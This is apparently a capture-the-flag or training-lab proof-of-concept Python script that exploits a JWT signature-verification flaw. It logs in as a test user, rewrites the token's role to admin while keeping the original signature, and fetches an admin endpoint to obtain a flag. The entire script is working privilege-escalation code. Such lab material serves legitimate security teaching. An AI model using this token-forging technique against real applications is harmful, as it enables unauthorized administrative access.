#!/usr/bin/env python3
"""
Lab #1 - Blind Trust
Vulnerability : jwt.decode() used instead of jwt.verify() - signature never checked
Attack        : flip role to admin in the payload, re-send with the original signature
"""
import argparse, base64, json, sys
import requests
from pwn import log


def parse_args():
    p = argparse.ArgumentParser(description='Lab #1 - Blind Trust PoC')
    p.add_argument('--url', default='http://localhost:3000', metavar='URL',
                   help='target base URL (default: http://localhost:3000)')
    return p.parse_args()


def b64url_dec(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_enc(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def main():
    args = parse_args()
    base_url = args.url.rstrip('/')

    s = requests.Session()

    log.info(f'Target: {base_url}')
    log.info('Logging in as alice...')
    r = s.post(f'{base_url}/api/login', json={'username': 'alice', 'password': 'alice123'})
    r.raise_for_status()
    token = s.cookies['session']
    log.success(f'Token: {token[:72]}...')

    header_b64, payload_b64, sig = token.split('.')
    payload = json.loads(b64url_dec(payload_b64))
    log.info(f'Original payload: {payload}')

    payload['role'] = 'admin'
    new_payload_b64 = b64url_enc(json.dumps(payload, separators=(',', ':')).encode())
    forged = f'{header_b64}.{new_payload_b64}.{sig}'
    log.info(f'Forged token (role=admin, original signature kept): {forged[:72]}...')

    r = requests.get(f'{base_url}/api/admin/users', cookies={'session': forged})
    if r.status_code != 200:
        log.failure(f'Unexpected status {r.status_code}: {r.text}')
        sys.exit(1)

    log.success(f'FLAG: {r.json()["flag"]}')


if __name__ == '__main__':
    main()
